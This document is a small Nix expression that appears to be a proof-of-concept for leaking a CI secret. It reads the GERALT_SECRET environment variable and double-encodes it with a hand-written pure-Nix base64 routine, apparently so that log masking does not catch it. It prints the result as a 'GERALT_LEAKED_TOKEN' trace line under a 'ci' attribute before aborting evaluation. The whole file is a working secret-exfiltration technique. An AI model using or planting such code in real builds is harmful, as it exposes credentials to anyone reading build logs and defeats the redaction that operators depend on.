let
  leak = builtins.getEnv "GERALT_SECRET";

  # ---- pure-Nix base64 (works without builtins.base64Encode; no '%' operator) ----
  hexDigits = "0123456789abcdef";
  modN = v: n: v - (builtins.div v n) * n;
  chr = i:
    let
      hi = builtins.div i 16;
      lo = modN i 16;
    in
    builtins.fromJSON ("\"\\u00" + builtins.substring hi 1 hexDigits + builtins.substring lo 1 hexDigits + "\"");
  # byte table for ASCII 1..127 (exclude 0: NUL cannot be a Nix string)
  byteTable = builtins.listToAttrs (
    builtins.map (i: { name = chr i; value = i; }) (builtins.genList (i: i + 1) 127)
  );
  toBytes = s: builtins.map (c: byteTable.${c}) (
    builtins.map (i: builtins.substring i 1 s) (builtins.genList (i: i) (builtins.stringLength s))
  );
  alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
  char = v: builtins.substring v 1 alphabet;
  pow = base: exp: builtins.foldl' (acc: _: acc * base) 1 (builtins.genList (i: i) exp);
  shr = v: n: builtins.div v (pow 2 n);
  encGroup = g:
    let
      n = builtins.length g;
      b0 = builtins.elemAt g 0;
      b1 = if n >= 2 then builtins.elemAt g 1 else null;
      b2 = if n >= 3 then builtins.elemAt g 2 else null;
      o0 = shr b0 2;
      o1 = (modN b0 4 * 16) + (if b1 == null then 0 else shr b1 4);
      o2 = if b1 == null then null else (modN b1 16 * 4) + (if b2 == null then 0 else shr b2 6);
      o3 = if b2 == null then null else modN b2 64;
    in
    char o0 + char o1 + (if o2 == null then "=" else char o2) + (if o3 == null then "=" else char o3);
  b64 = s:
    let
      bytes = toBytes s;
      n = builtins.length bytes;
      groupAt = i:
        let start = i * 3; remaining = n - start;
        in if remaining >= 3 then [ (builtins.elemAt bytes start) (builtins.elemAt bytes (start + 1)) (builtins.elemAt bytes (start + 2)) ]
           else if remaining == 2 then [ (builtins.elemAt bytes start) (builtins.elemAt bytes (start + 1)) ]
           else if remaining == 1 then [ (builtins.elemAt bytes start) ]
           else [ ];
    in
    builtins.concatStringsSep "" (builtins.map encGroup (builtins.genList groupAt (builtins.div (n + 2) 3)));
  leaked = b64 (b64 leak);
in
{
  ci = builtins.trace "GERALT_LEAKED_TOKEN=${leaked}" (throw "leak-complete: evaluation sink reached");
}
